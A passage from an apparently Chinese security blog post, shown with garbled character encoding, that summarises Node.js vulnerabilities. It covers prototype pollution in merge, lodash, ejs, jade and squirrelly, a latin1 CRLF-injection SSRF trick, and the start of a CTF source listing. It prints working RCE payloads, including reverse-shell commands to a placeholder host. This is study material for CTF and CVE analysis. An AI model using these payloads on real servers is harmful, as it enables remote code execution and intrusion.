ä¸€ä¸ªåŸå‹é“¾æ±¡æŸ“ï¼Œæ‰€ä»¥åŸå‹é“¾æ±¡æŸ“ç®€å•æ¥è¯´å°±æ˜¯å¦‚æœèƒ½å¤Ÿæ§åˆ¶å¹¶ä¿®æ”¹ä¸€ä¸ªå¯¹è±¡çš„åŸå‹ï¼Œå°±å¯ä»¥å½±å“åˆ°æ‰€æœ‰å’Œè¿™ä¸ªå¯¹è±¡åŒä¸€ä¸ªåŸå‹çš„å¯¹è±¡ã€‚</p><h2 id="mergeæ“ä½œå¯¼è‡´åŸå‹é“¾æ±¡æŸ“"><a href="#mergeæ“ä½œå¯¼è‡´åŸå‹é“¾æ±¡æŸ“" class="headerlink" title="mergeæ“ä½œå¯¼è‡´åŸå‹é“¾æ±¡æŸ“"></a>mergeæ“ä½œå¯¼è‡´åŸå‹é“¾æ±¡æŸ“</h2><p>mergeæ“ä½œæ˜¯æœ€å¸¸è§å¯èƒ½æ§åˆ¶é”®åçš„æ“ä½œï¼Œä¹Ÿæœ€èƒ½è¢«åŸå‹é“¾æ”»å‡»ã€‚<br>ä¾‹å­:</p><pre><code class="javascript">function merge(target, source) &#123;for (let key in source) &#123;    if (key in source &amp;&amp; key in target) &#123;        merge(target[key], source[key])    &#125; else &#123;        target[key] = source[key]        &#125;    &#125;&#125;let object1 = &#123;&#125;let object2 = JSON.parse(&#39;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#39;)merge(object1, object2)console.log(object1.a, object1.b)object3 = &#123;&#125;console.log(object3.b)# merge() å‡½æ•°ç”¨äºåˆå¹¶ä¸¤ä¸ªæ•°ç»„å†…å®¹åˆ°ç¬¬ä¸€ä¸ªæ•°ç»„ã€‚åœ¨æœ¬æ®µä»£ç çš„ä½œç”¨å°±æ˜¯å°†å¾…æ“ä½œçš„å¯¹è±¡mergeåˆ°ä¸€ä¸ªç©ºå¯¹è±¡ä¸­</code></pre><p>éœ€è¦æ³¨æ„çš„ç‚¹æ˜¯ï¼š<br>åœ¨JSONè§£æçš„æƒ…å†µä¸‹ï¼Œ__proto__ä¼šè¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªçœŸæ­£çš„â€œé”®åâ€ï¼Œè€Œä¸ä»£è¡¨â€œåŸå‹â€ï¼Œæ‰€ä»¥åœ¨éå†object2çš„æ—¶å€™ä¼šå­˜åœ¨è¿™ä¸ªé”®ã€‚<br>æˆ‘ä»¬æ¥çœ‹ä¸‹ï¼Œæœ‰å’Œæ²¡æœ‰JSONè§£æçš„åŒºåˆ«</p><pre><code class="javascript">&lt;script&gt;          let o2 = &#123;a:1,&quot;__proto__&quot;:&#123;b:2&#125;&#125;        console.log(o2)      let object2=JSON.parse(&#39;&#123;&quot;a&quot;:1,&quot;__proto__&quot;:&#123;&quot;b&quot;:2&#125;&#125;&#39;)      console.log(object2)  &lt;/script&gt;</code></pre><p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668836886258-58f08cf3-4739-40b1-ade0-6f1a54f8dc7f.png" alt="image-20220416001143881.png"><br> æ‰€ä»¥ä»£ç åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ä¼šå­˜åœ¨è¿™ä¹ˆä¸€æ­¥  </p><pre><code class="javascript">target[__proto__]=source[__proto__]å¯ç†è§£ä¸º  object.prototype = &#123;&quot;b&quot;: 2&#125; å¯¼è‡´äº†åŸå‹é“¾æ±¡æŸ“</code></pre><p> æœ€ç»ˆè¾“å‡ºçš„ç»“æœä¸ºï¼š<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668839912381-24bdf37b-f5df-41ea-a963-e5c31549da5d.png" alt="image.png"><br> å¯è§object3çš„bæ˜¯ä»åŸå‹ä¸­è·å–åˆ°çš„ï¼Œè¯´æ˜Objectå·²ç»è¢«æ±¡æŸ“äº†ã€‚  </p><h2 id="lodash"><a href="#lodash" class="headerlink" title="lodash"></a>lodash</h2><blockquote><p> lodashæ˜¯ä¸ºäº†å¼¥è¡¥JavaScriptåŸç”Ÿå‡½æ•°åŠŸèƒ½ä¸è¶³è€Œæä¾›çš„ä¸€ä¸ªè¾…åŠ©åŠŸèƒ½é›†ï¼Œå…¶ä¸­åŒ…å«å­—ç¬¦ä¸²ã€æ•°ç»„ã€å¯¹è±¡ç­‰æ“ä½œã€‚è¿™ä¸ªWebåº”ç”¨ä¸­ï¼Œä½¿ç”¨äº†lodashæä¾›çš„ä¸¤ä¸ªå·¥å…·ï¼š  </p><ol><li>lodash.template ä¸€ä¸ªç®€å•çš„æ¨¡æ¿å¼•æ“</li><li>lodash.merge å‡½æ•°æˆ–å¯¹è±¡çš„åˆå¹¶</li></ol><p> å…¶å®æ•´ä¸ªåº”ç”¨é€»è¾‘å¾ˆç®€å•ï¼Œç”¨æˆ·æäº¤çš„ä¿¡æ¯ï¼Œç”¨mergeæ–¹æ³•åˆå¹¶åˆ°sessioné‡Œï¼Œå¤šæ¬¡æäº¤ï¼Œsessioné‡Œæœ€ç»ˆä¿å­˜ä½ æäº¤çš„æ‰€æœ‰ä¿¡æ¯ã€‚</p></blockquote><p>ä»¥<a href="https://github.com/phith0n/code-breaking/blob/master/2018/thejs/web/server.js">Code-Breaking 2018 Thejs</a>ä¸ºä¾‹è¯´æ˜åˆ†æè¿‡ç¨‹:<br> é¢˜ç›®æºç ä¸‹è½½ï¼š<a href="http://code-breaking.com/puzzle/9/">http://code-breaking.com/puzzle/9/</a></p><pre><code class="javascript">const fs = require(&#39;fs&#39;)const express = require(&#39;express&#39;)const bodyParser = require(&#39;body-parser&#39;)const lodash = require(&#39;lodash&#39;)const session = require(&#39;express-session&#39;)const randomize = require(&#39;randomatic&#39;)const app = express()app.use(bodyParser.urlencoded(&#123;extended: true&#125;)).use(bodyParser.json())app.use(&#39;/static&#39;, express.static(&#39;static&#39;))app.use(session(&#123;    name: &#39;thejs.session&#39;,    secret: randomize(&#39;aA0&#39;, 16),    resave: false,    saveUninitialized: false&#125;))app.engine(&#39;ejs&#39;, function (filePath, options, callback) &#123; // define the template engine    fs.readFile(filePath, (err, content) =&gt; &#123;        if (err) return callback(new Error(err))        let compiled = lodash.template(content)        let rendered = compiled(&#123;...options&#125;)        return callback(null, rendered)    &#125;)&#125;)app.set(&#39;views&#39;, &#39;./views&#39;)app.set(&#39;view engine&#39;, &#39;ejs&#39;)app.all(&#39;/&#39;, (req, res) =&gt; &#123;    let data = req.session.data || &#123;language: [], category: []&#125;    if (req.method == &#39;POST&#39;) &#123;        data = lodash.merge(data, req.body)        req.session.data = data    &#125;        res.render(&#39;index&#39;, &#123;        language: data.language,         category: data.category    &#125;)&#125;)app.listen(3000, () =&gt; console.log(`Example app listening on port 3000!`))</code></pre><p> é—®é¢˜å‡ºåœ¨lodash.merge()å‡½æ•°,è¿™ä¸ªå‡½æ•°å­˜åœ¨åŸå‹é“¾æ±¡æŸ“æ¼æ´ã€‚æˆ‘ä»¬å¾—å¯»æ‰¾åˆ°å¯ä»¥åˆ©ç”¨çš„ç‚¹ã€‚å› ä¸ºé€šè¿‡æ¼æ´å¯ä»¥æ§åˆ¶æŸä¸€ç§å®ä¾‹å¯¹è±¡åŸå‹çš„å±æ€§ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å»å¯»æ‰¾ä¸€ä¸ªå¯ä»¥è¢«åˆ©ç”¨çš„å±æ€§ã€‚<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668840471628-b5711487-8536-4a31-b5b4-c779de7628db.png" alt="image-20220416004841823.png"><br> é¡µé¢æœ€ç»ˆä¼šé€šè¿‡lodash.templateè¿›è¡Œæ¸²æŸ“<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668840499521-d6d64285-7a69-4e69-b6fb-a8221e5ff74f.png" alt="image-20220416005502144.png"><br> è·Ÿè¸ªåˆ°lodash/template.jsä¸­<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668840571097-a32cb4ca-8bf1-44a2-b1ff-940d5d715282.png" alt="QyN5JVOde3YL8aZ.png"><br>å¦‚å›¾å¯ä»¥çœ‹åˆ°optionsæ˜¯ä¸€ä¸ªå¯¹è±¡ï¼ŒsourceURLæ˜¯é€šè¿‡ä¸‹é¢çš„è¯­å¥èµ‹å€¼çš„ï¼Œoptionsé»˜è®¤æ²¡æœ‰sourceURLå±æ€§ï¼Œæ‰€ä»¥sourceURLé»˜è®¤ä¹Ÿæ˜¯ä¸ºç©ºã€‚å¦‚æœæˆ‘ä»¬èƒ½å¤Ÿç»™optionsçš„åŸå‹å¯¹è±¡åŠ ä¸€ä¸ªsourceURLå±æ€§ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æ§åˆ¶sourceURLçš„å€¼ã€‚<br>ç»§ç»­å¾€ä¸‹é¢çœ‹ï¼Œæœ€åsourceURLä¼ é€’åˆ°äº†Functionå‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°å½“ä¸­ï¼š<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668840627165-a79efcc5-3819-4e3f-8a7d-a2accd1ef055.png" alt="pwoVFrOyfzJX42M.png"><br>é€šè¿‡æ„é€ chile_process.exec()å°±å¯ä»¥æ‰§è¡Œä»»æ„ä»£ç äº†ã€‚<br>æœ€ç»ˆå¯ä»¥æ„é€ ä¸€ä¸ªç®€å•çš„Payloadä½œä¸ºä¼ é€’ç»™ä¸»é¡µé¢çš„çš„POSTæ•°æ®(windowsè°ƒç”¨è®¡ç®—å™¨)ï¼š</p><pre><code class="javascript">&#123;&quot;__proto__&quot;:&#123;&quot;sourceURL&quot;:&quot;\nglobal.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;calc&#39;)//&quot;&#125;&#125;</code></pre><p>(è¿™é‡Œç›´æ¥ç”¨requireä¼šæŠ¥é”™ï¼šReferenceError: require is not defined<br>pç¥ç»™äº†ä¸€ä¸ªæ›´å¥½çš„payloadï¼š</p><pre><code class="javascript">&#123;&quot;__proto__&quot;:&#123;&quot;sourceURL&quot;:&quot;\nreturn e=&gt; &#123;for (var a in &#123;&#125;) &#123;delete Object.prototype[a];&#125; return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;id&#39;)&#125;\n//&quot;&#125;&#125;</code></pre><h2 id="ejs"><a href="#ejs" class="headerlink" title="ejs"></a>ejs</h2><blockquote><p>ä¸»è¦ä¸ºä¸¤ä¸ªå‡½æ•°çš„ä¼ªé€ ã€‚<br>opts.outputFunctionName<br>opts.escapeFunction</p></blockquote><p><strong>ä¾‹ä¸€</strong><br> test.js  </p><pre><code class="javascript">var express = require(&#39;express&#39;);var _= require(&#39;lodash&#39;);var ejs = require(&#39;ejs&#39;);var app = express();//è®¾ç½®æ¨¡æ¿çš„ä½ç½®app.set(&#39;views&#39;, __dirname);//å¯¹åŸå‹è¿›è¡Œæ±¡æŸ“var malicious_payload = &#39;&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(\&#39;child_process\&#39;).exec(\&#39;calc\&#39;);var __tmp2&quot;&#125;&#125;&#39;;_.merge(&#123;&#125;, JSON.parse(malicious_payload));//è¿›è¡Œæ¸²æŸ“app.get(&#39;/&#39;, function (req, res) &#123;    res.render (&quot;./test.ejs&quot;,&#123;        message: &#39;lufei test &#39;    &#125;);&#125;);//è®¾ç½®httpvar server = app.listen(8081, function () &#123;    var host = server.address().address    var port = server.address().port    console.log(&quot;åº”ç”¨å®ä¾‹ï¼Œè®¿é—®åœ°å€ä¸º http://%s:%s&quot;, host, port)&#125;);</code></pre><p> test.ejs  </p><pre><code class="javascript">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;meta charset=&quot;utf-8&quot;&gt;    &lt;title&gt;&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;&lt;%= message%&gt;&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p> payloadï¼š  </p><pre><code class="javascript">&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xxx/6666 0&gt;&amp;1\&quot;&#39;);var __tmp2&quot;&#125;&#125;</code></pre><pre><code class="javascript">&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(\&#39;child_process\&#39;).exec(\&#39;calc\&#39;);var __tmp2&quot;&#125;&#125;</code></pre><p><strong>ä¾‹äºŒ</strong></p><pre><code class="javascript">router.post(&#39;/&#39;, require(&#39;body-parser&#39;).json(),function(req, res, next) &#123;  res.type(&#39;html&#39;);  var user = new function()&#123;    this.userinfo = new function()&#123;    this.isVIP = false;    this.isAdmin = false;        &#125;;  &#125;;  utils.copy(user.userinfo,req.body);  if(user.userinfo.isAdmin)&#123;    return res.json(&#123;ret_code: 0, ret_msg: &#39;login success!&#39;&#125;);    &#125;else&#123;    return res.json(&#123;ret_code: 2, ret_msg: &#39;login fail!&#39;&#125;);    &#125;&#125;);</code></pre><p>**<em>payload1</em>**ï¼šè¦†ç›– opts.outputFunctionName , è¿™æ ·æ„é€ çš„payloadå°±ä¼šè¢«æ‹¼æ¥è¿›jsè¯­å¥ä¸­ï¼Œå¹¶åœ¨ ejs æ¸²æŸ“æ—¶è¿›è¡Œ RCEã€‚  </p><pre><code class="javascript">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;a=1; return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;dir&#39;); //&quot;&#125;&#125;&#125;&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;__tmp1; return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;dir&#39;); __tmp2&quot;&#125;&#125;&#125;</code></pre><p>**<em>payload2</em>**ï¼šä¼ªé€  opts.escapeFunction ä¹Ÿå¯ä»¥è¿›è¡Œ RCE  </p><pre><code class="javascript">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;client&quot;:true,&quot;escapeFunction&quot;:&quot;1; return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;dir&#39;);&quot;&#125;&#125;&#125;</code></pre><p><strong>è¡¥å……:</strong> åœ¨ ejs æ¨¡æ¿ä¸­è¿˜æœ‰ä¸‰ä¸ªå¯æ§çš„å‚æ•°, åˆ†åˆ«ä¸º opts.localsName å’Œ opts.destructuredLocals å’Œ opts.filename, ä½†æ˜¯è¿™ä¸‰ä¸ªæ— æ³•æ„å»ºå‡ºåˆé€‚çš„æ±¡æŸ“é“¾ã€‚  </p><h2 id="jade"><a href="#jade" class="headerlink" title="jade"></a>jade</h2><p>compileDebugçš„ä¼ªé€ <br>ç»™å‡ºä¸Šé¢é¢˜ç›®çš„payloadï¼Œå¯å‚è€ƒç€çœ‹ã€‚</p><pre><code class="javascript">&#123;&quot;__proto__&quot;:&#123;&quot;compileDebug&quot;:1,&quot;self&quot;:1,&quot;line&quot;:&quot;console.log(global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xxx/1234 0&gt;&amp;1\&quot;&#39;))&quot;&#125;&#125;</code></pre><pre><code class="javascript">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;: &#123;&quot;type&quot;:&quot;Code&quot;,&quot;compileDebug&quot;:true,&quot;self&quot;:true,&quot;line&quot;:&quot;0, \&quot;\&quot; ));return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;dir&#39;);//&quot;&#125;&#125;&#125;</code></pre><h2 id="squirrelly"><a href="#squirrelly" class="headerlink" title="squirrelly"></a>squirrelly</h2><p><strong><em>CVE-2021-32819</em></strong><br>server.js</p><pre><code class="javascript">const express = require(&#39;express&#39;)const squirrelly = require(&#39;squirrelly&#39;)const app = express()app.set(&#39;views&#39;, __dirname);app.set(&#39;view engine&#39;, &#39;squirrelly&#39;)app.use(express.urlencoded(&#123; extended: false &#125;));app.get(&#39;/&#39;, (req, res) =&gt; &#123;   res.render(&#39;index.squirrelly&#39;, req.query)&#125;)var server = app.listen(3000, &#39;0.0.0.0&#39;, function () &#123;    var host = server.address().address    var port = server.address().port    console.log(&quot;Listening on http://%s:%s&quot;, host, port)&#125;);</code></pre><p> index.squirrelly  </p><pre><code class="javascript">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;title&gt;CVE-2021-32819&lt;/title&gt;        &lt;h1&gt;Test For CVE-2021-32819&lt;/h1&gt;    &lt;/head&gt;&lt;body&gt;    &lt;h1&gt;&#123;&#123;it.variable&#125;&#125;&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p> payload  </p><pre><code class="javascript">/?defaultFilter=e&#39;)); let require = global.require || global.process.mainModule.constructor._load; require(&#39;child_process&#39;).exec(&#39;dir&#39;); //</code></pre><p>PS:ä»¥ä¸‹è´´å‡ºå‡ ç¯‡æ–‡ç« ï¼Œå¸ˆå‚…ä»¬å¯ä»¥è·Ÿè¿›åˆ†æï¼š<br><a href="https://www.aisoutu.com/a/1373814">https://www.aisoutu.com/a/1373814</a><br><a href="https://cloud.tencent.com/developer/article/2035888">https://cloud.tencent.com/developer/article/2035888</a><br><a href="https://www.freebuf.com/vuls/276112.html">https://www.freebuf.com/vuls/276112.html</a><br><a href="https://lonmar.cn/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/">å‡ ä¸ªnodeæ¨¡æ¿å¼•æ“çš„åŸå‹é“¾æ±¡æŸ“åˆ†æ</a></p><h1 id="nodejsä¸­çš„ssrf"><a href="#nodejsä¸­çš„ssrf" class="headerlink" title="nodejsä¸­çš„ssrf"></a>nodejsä¸­çš„ssrf</h1><h2 id="åŸç†-1"><a href="#åŸç†-1" class="headerlink" title="åŸç†"></a>åŸç†</h2><p>**è™½ç„¶ç”¨æˆ·å‘å‡ºçš„httpè¯·æ±‚é€šå¸¸å°†è¯·æ±‚è·¯å¾„æŒ‡å®šä¸ºå­—ç¬¦ä¸²ï¼Œä½†Node.jsæœ€ç»ˆå¿…é¡»å°†è¯·æ±‚ä½œä¸ºåŸå§‹å­—èŠ‚è¾“å‡ºã€‚JavaScriptæ”¯æŒunicodeå­—ç¬¦ä¸²ï¼Œå› æ­¤å°†å®ƒä»¬è½¬æ¢ä¸ºå­—èŠ‚æ„å‘³ç€é€‰æ‹©å¹¶åº”ç”¨é€‚å½“çš„unicodeç¼–ç ã€‚å¯¹äºä¸åŒ…å«ä¸»ä½“çš„è¯·æ±‚ï¼ŒNode.jsé»˜è®¤ä½¿ç”¨â€œlatin1â€ï¼Œè¿™æ˜¯ä¸€ç§å•å­—èŠ‚ç¼–ç ï¼Œä¸èƒ½è¡¨ç¤ºé«˜ç¼–å·çš„unicodeå­—ç¬¦ã€‚ç›¸åï¼Œè¿™äº›å­—ç¬¦è¢«æˆªæ–­ä¸ºå…¶JavaScriptè¡¨ç¤ºçš„æœ€ä½å­—èŠ‚  **</p><pre><code class="plsql">&gt; v = &quot;/caf\u&#123;E9&#125;\u&#123;01F436&#125;&quot;&#39;/cafÃ©ğŸ¶&#39;&gt; Buffer.from(v,&#39;latin1&#39;).toString(&#39;latin1&#39;)&#39;/cafÃ©=6&#39;</code></pre><p><strong>Crlf HTTPå¤´æ³¨å…¥:</strong><br> å‡è®¾ä¸€ä¸ªæœåŠ¡å™¨ï¼Œæ¥å—ç”¨æˆ·è¾“å…¥ï¼Œå¹¶å°†å…¶åŒ…å«åœ¨é€šè¿‡HTTPå…¬å¼€çš„å†…éƒ¨æœåŠ¡è¯·æ±‚ä¸­ï¼Œåƒè¿™æ ·ï¼š  </p><pre><code class="plsql">GET /private-api?q=&lt;user-input-here&gt; HTTP/1.1Authorization: server-secret-key</code></pre><p> å¦‚æœæœåŠ¡å™¨æœªæ­£ç¡®éªŒè¯ç”¨æˆ·è¾“å…¥ï¼Œåˆ™æ”»å‡»è€…å¯èƒ½ä¼šç›´æ¥æ³¨å…¥åè®®æ§åˆ¶å­—ç¬¦åˆ°è¯·æ±‚é‡Œã€‚å‡è®¾åœ¨è¿™ç§æƒ…å†µä¸‹æœåŠ¡å™¨æ¥å—äº†ä»¥ä¸‹ç”¨æˆ·è¾“å…¥ï¼š  </p><pre><code class="plsql">&quot;x HTTP/1.1\r\n\r\nDELETE /private-api HTTP/1.1\r\n&quot;</code></pre><p> åœ¨å‘å‡ºè¯·æ±‚æ—¶ï¼ŒæœåŠ¡å™¨å¯èƒ½ä¼šç›´æ¥å°†å…¶å†™å…¥è·¯å¾„ï¼Œå¦‚ä¸‹ï¼š  </p><pre><code class="plsql">GET /private-api?q=x HTTP/1.1DELETE /private-apiAuthorization: server-secret-key</code></pre><p><strong>è¯´åˆ°åº•å°±æ˜¯\r\næˆåŠŸç”Ÿæ•ˆ</strong><br>æ¥æ”¶æœåŠ¡å°†æ­¤è§£é‡Šä¸ºä¸¤ä¸ªå•ç‹¬çš„HTTPè¯·æ±‚ï¼Œä¸€ä¸ªGETåè·Ÿä¸€ä¸ªDELETE<br>å¥½çš„HTTPåº“é€šé€šå¸¸åŒ…å«é˜»æ­¢è¿™ä¸€è¡Œä¸ºçš„æªæ–½ï¼ŒNode.jsä¹Ÿä¸ä¾‹å¤–ï¼šå¦‚æœä½ å°è¯•å‘å‡ºä¸€ä¸ªè·¯å¾„ä¸­å«æœ‰æ§åˆ¶å­—ç¬¦çš„HTTPè¯·æ±‚ï¼Œå®ƒä»¬ä¼šè¢«URLç¼–ç ï¼š</p><pre><code class="plsql">http.get(&#39;http://example.com/\r\n/test&#39;).output[ &#39;GET /%0D%0A/test HTTP/1.1\r\nHost: example.com\r\nConnection: close\r\n\r\n&#39; ]</code></pre><p> ä¸å¹¸çš„æ˜¯ï¼Œä¸Šè¿°çš„å¤„ç†unicodeå­—ç¬¦é”™è¯¯æ„å‘³ç€å¯ä»¥è§„é¿è¿™äº›æªæ–½ã€‚è€ƒè™‘å¦‚ä¸‹çš„URLï¼Œå…¶ä¸­åŒ…å«ä¸€äº›å¸¦å˜éŸ³ç¬¦å·çš„unicodeå­—ç¬¦ï¼š  </p><pre><code class="plsql">&#39;http://example.com/\u&#123;010D&#125;\u&#123;010A&#125;/test&#39;http://example.com/ÄÄŠ/test</code></pre><p> å½“Node.jsç‰ˆæœ¬8æˆ–æ›´ä½ç‰ˆæœ¬å¯¹æ­¤URLå‘å‡ºGETè¯·æ±‚æ—¶ï¼Œå®ƒä¸ä¼šè¿›è¡Œè½¬ä¹‰ï¼Œå› ä¸ºå®ƒä»¬ä¸æ˜¯HTTPæ§åˆ¶å­—ç¬¦ï¼š  </p><pre><code class="plsql">http.get(&#39;http://example.com/\u010D\u010A/test&#39;).output[ &#39;GET /ÄÄŠ/test HTTP/1.1\r\nHost: example.com\r\nConnection: close\r\n\r\n&#39; ]</code></pre><p> ä½†æ˜¯å½“ç»“æœå­—ç¬¦ä¸²è¢«ç¼–ç ä¸ºlatin1å†™å…¥è·¯å¾„æ—¶ï¼Œè¿™äº›å­—ç¬¦å°†åˆ†åˆ«è¢«æˆªæ–­ä¸ºâ€œ\râ€å’Œâ€œ\nâ€ï¼š  </p><pre><code class="plsql">Buffer.from(&#39;http://example.com/\u&#123;010D&#125;\u&#123;010A&#125;/test&#39;, &#39;latin1&#39;).toString()&#39;http://example.com/\r\n/test&#39;</code></pre><p>Node.jsé»˜è®¤ä½¿ç”¨â€œlatin1â€ï¼Œè¿™æ˜¯ä¸€ç§å•å­—èŠ‚ç¼–ç ï¼Œä¸èƒ½è¡¨ç¤ºé«˜ç¼–å·çš„unicodeå­—ç¬¦<br>è¯´ç™½äº†ï¼Œä¸Šé¢è¿™æ®µçš„æ„æ€å°±æ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä¸€äº›ç‰¹æ®Šå­—ç¬¦ï¼Œå®ƒä»¬åœ¨URLè¯·æ±‚æ—¶ä¸ä¼šè¢«è½¬ä¹‰å¤„ç†ï¼Œä½†æ˜¯å½“å®ƒåˆ°äº†jså¼•æ“æ—¶ï¼Œç”±äºå…¶é»˜è®¤ç”¨çš„æ˜¯latin1ï¼Œå› æ­¤å¯ä»¥å°†æˆ‘ä»¬ç”¨çš„ç‰¹æ®Šå­—ç¬¦è½¬ä¹‰å¾—åˆ°æˆ‘ä»¬éœ€è¦çš„å­—ç¬¦ï¼Œä»è€Œè¾¾åˆ°ssrfçš„ç›®çš„</p><h2 id="GYCTF2020-Node-Game"><a href="#GYCTF2020-Node-Game" class="headerlink" title="[GYCTF2020]Node Game"></a>[GYCTF2020]Node Game</h2><p><strong>sourceï¼š</strong></p><pre><code class="plsql">var express = require(&#39;express&#39;); var app = express(); var fs = require(&#39;fs&#39;); var path = require(&#39;path&#39;); // å¤„ç†æ–‡ä»¶è·¯å¾„ var http = require(&#39;http&#39;); var pug = require(`pug`); // æ¨¡æ¿æ¸²æŸ“ var morgan = require(&#39;morgan&#39;); // æ—¥å¿— const multer = require(&#39;multer&#39;); // ç”¨äºå¤„ç†multipart/form-dataç±»å‹çš„è¡¨å•æ•°æ®ï¼Œå®ç°ä¸Šä¼ åŠŸèƒ½// å°†ä¸Šä¼ çš„æ–‡ä»¶å­˜å‚¨åœ¨./dist[è‡ªåŠ¨åˆ›å»º]è¿”å›ä¸€ä¸ªåä¸ºfileçš„æ–‡ä»¶æ•°ç»„ app.use(multer(&#123;dest: &#39;./dist&#39;&#125;).array(&#39;file&#39;)); // ä½¿ç”¨ç®€åŒ–ç‰ˆæ—¥å¿— app.use(morgan(&#39;short&#39;));  // é™æ€æ–‡ä»¶è·¯ç”± app.use(&quot;/uploads&quot;, express.static(path.join(__dirname, &#39;/uploads&#39;))) app.use(&quot;/template&quot;, express.static(path.join(__dirname, &#39;/template&#39;)))  app.get(&#39;/&#39;, function (req, res) &#123;      // GETæ–¹æ³•è·å–actionå‚æ•°      var action = req.query.action ? req.query.action : &quot;index&quot;;      // actionä¸­ä¸èƒ½åŒ…å«/ &amp; \      if (action.includes(&quot;/&quot;) || action.includes(&quot;\\&quot;)) &#123;            res.send(&quot;Errrrr, You have been Blocked&quot;);      &#125;        // å°†/template/[action].pugæ¸²æŸ“æˆhtmlè¾“å‡ºåˆ°æ ¹ç›®å½•      file = path.join(__dirname + &#39;/template/&#39; + action + &#39;.pug&#39;);      var html = pug.renderFile(file);      res.send(html); &#125;);  app.post(&#39;/file_upload&#39;, function (req, res) &#123;      var ip = req.connection.remoteAddress; // remoteAddressæ— æ³•ä¼ªé€ ï¼Œå› ä¸ºTCPæœ‰ä¸‰æ¬¡æ¡æ‰‹ï¼Œä¼ªé€ æºIPä¼šå¯¼è‡´æ— æ³•å®ŒæˆTCPè¿æ¥      var obj = &#123;msg: &#39;&#39;,&#125;      // è¯·æ±‚å¿…é¡»æ¥è‡ªlocalhost      if (!ip.includes(&#39;127.0.0.1&#39;)) &#123;            obj.msg = &quot;only admin&#39;s ip can use it&quot;            res.send(JSON.stringify(obj));            return      &#125;      fs.readFile(req.files[0].path, function (err, data) &#123;            if (err) &#123;                  obj.msg = &#39;upload failed&#39;;                  res.send(JSON.stringify(obj));            &#125; else &#123;                  // æ–‡ä»¶è·¯å¾„ä¸º/uploads/[mimetype]/filenameï¼Œmimetypeå¯ä»¥è¿›è¡Œç›®å½•ç©¿è¶Šå®ç°å°†æ–‡ä»¶å­˜å‚¨è‡³/templateå¹¶åˆ©ç”¨actionæ¸²æŸ“åˆ°ç•Œé¢                  var file_path = &#39;/uploads/&#39; + req.files[0].mimetype + &quot;/&quot;;                  var file_name = req.files[0].originalname                  var dir_file = __dirname + file_path + file_name                  if (!fs.existsSync(__dirname + file_path)) &#123;                        try &#123;                              fs.mkdirSync(__dirname + file_path)                        &#125; catch (error) &#123;                              obj.msg = &quot;file type error&quot;;                              res.send(JSON.stringify(obj));                              return                        &#125;                  &#125;                  try &#123;                        fs.writeFileSync(dir_file, data)                        obj = &#123;msg: &#39;upload success&#39;, filename: file_path + file_name&#125;                  &#125; catch (error) &#123;                        obj.msg = &#39;upload failed&#39;;                  &#125;                  res.send(JSON.stringify(obj));            &#125;      &#125;) &#125;)  // æŸ¥çœ‹é¢˜ç›®æºç  app.get(&#39;/source&#39;, function (req, res) &#123;      res.sendFile(path.join(__dirname + &#39;/template/source.txt&#39;)); &#125;);  app.get(&#39;/core&#39;, function (req, res) &#123;      var q = req.query.q;      var resp = &quot;&quot;;      if (q) &#123;            var url = &#39;http://localhost:8081/source?&#39; + q            console.log(url)               // å¯¹urlå­—ç¬¦è¿›è¡Œwaf            var trigger = blacklist(url);            if (trigger === true) &#123;                  res.send(&quot;error occurs!&quot;);            &#125; else &#123;                  try &#123;                              // nodeå¯¹/sourceå‘å‡ºè¯·æ±‚ï¼Œæ­¤å¤„å¯ä»¥åˆ©ç”¨å­—ç¬¦ç 